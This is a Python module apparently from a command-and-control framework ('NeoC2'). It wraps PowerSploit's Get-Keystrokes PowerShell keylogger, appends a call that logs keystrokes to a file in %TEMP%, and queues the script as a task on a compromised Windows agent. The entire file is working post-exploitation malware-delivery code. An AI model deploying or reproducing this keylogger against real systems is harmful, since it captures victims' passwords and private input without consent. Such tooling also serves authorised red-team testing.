# modules/keylogger.py
import os
import importlib.util
import re


def get_info():
    """Get module information"""
    return {
        "name": "keylogger",
        "description": "Execute a PowerShell keylogger that logs keystrokes to a file",
        "type": "post-exploitation",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1056.001,T1059.001",
        "mitre_tactics": ["Collection", "Execution"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run the keylogger on",
                "required": True
            },
            "log_path": {
                "description": "Path where keystrokes will be logged (default: %TEMP%\\key.log)",
                "required": False,
                "default": "%TEMP%\\key.log"
            },
            "timeout": {
                "description": "Time in minutes to capture keystrokes (default: runs indefinitely)",
                "required": False,
                "default": ""
            },

        }
    }


def execute(options, session):
    """Execute the keylogger module with given options and session"""
    agent_id = options.get("agent_id")
    log_path = options.get("log_path", "%TEMP%\\key.log")
    timeout = options.get("timeout", "")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    if timeout and not re.match(r'^\d+(\.\d+)?$', timeout):
        return {
            "success": False,
            "error": f"Invalid timeout value: {timeout}. Must be a positive number"
        }
    
    # Sanitize log_path to prevent command injection
    # Only allow alphanumeric characters, spaces, and common path characters
    if not re.match(r'^[a-zA-Z0-9_\-\\\/:%.~\s]+$', log_path):
        return {
            "success": False,
            "error": f"Invalid log_path: {log_path}. Contains invalid characters."
        }
    
    # Set the current agent in the session
    session.current_agent = agent_id
    

    
    # Read the original Get-Keystrokes.ps1 script
    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Get-Keystrokes.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find keylogger script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading keylogger script: {str(e)}"
        }
    
    # Modify the original script to call the Get-Keystrokes function with parameters
    if timeout:
        # Add the function call to the script with timeout - properly escape the parameters
        execution_script = f'{original_script}\nGet-Keystrokes -LogPath "{log_path}" -Timeout {timeout}'
    else:
        # Add the function call to the script without timeout (infinite) - properly escape the parameter
        execution_script = f'{original_script}\nGet-Keystrokes -LogPath "{log_path}"'
    
    # Return the execution script directly - the agent will handle PowerShell execution
    powershell_command = execution_script
    
    # Check if session has a valid agent_manager
    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }
    
    # Queue the task on the agent
    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Keylogger task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "log_path": log_path,
                "timeout": timeout if timeout else "indefinite"
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }